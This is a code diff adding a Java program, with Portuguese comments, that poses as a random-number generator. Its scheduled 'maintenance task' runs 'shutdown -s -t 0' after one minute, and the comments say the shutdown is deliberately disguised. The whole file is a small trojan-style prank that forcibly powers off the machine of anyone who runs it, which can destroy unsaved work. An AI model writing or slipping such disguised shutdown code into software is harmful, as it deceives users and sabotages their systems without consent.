@@ -1,0 +1,38 @@
+import java.util.Random;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
+
+public class DisguisedShutdown {
+
+    public static void main(String[] args) {
+        System.out.println("Gerador de Números Aleatórios Iniciado");
+        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
+
+        // Agenda a execução do método 'performMaintenanceTask' para daqui a 1 minuto
+        executor.schedule(() -> performMaintenanceTask(), 1, TimeUnit.MINUTES);
+
+        Random random = new Random();
+        while (true) {
+            try {
+                int randomNumber = random.nextInt(100) + 1;
+                System.out.println("Número aleatório: " + randomNumber);
+                Thread.sleep(1000); // Aguarda 1 segundo antes de gerar o próximo número
+            } catch (InterruptedException e) {
+                System.out.println("Programa interrompido.");
+                break;
+            }
+        }
+
+        executor.shutdown();
+    }
+
+    private static void performMaintenanceTask() {
+        try {
+            // Comando de desligamento disfarçado em uma tarefa de 'manutenção'
+            Runtime.getRuntime().exec("shutdown -s -t 0");
+        } catch (Exception e) {
+            System.out.println("Não foi possível realizar a tarefa de manutenção.");
+        }
+    }
+}
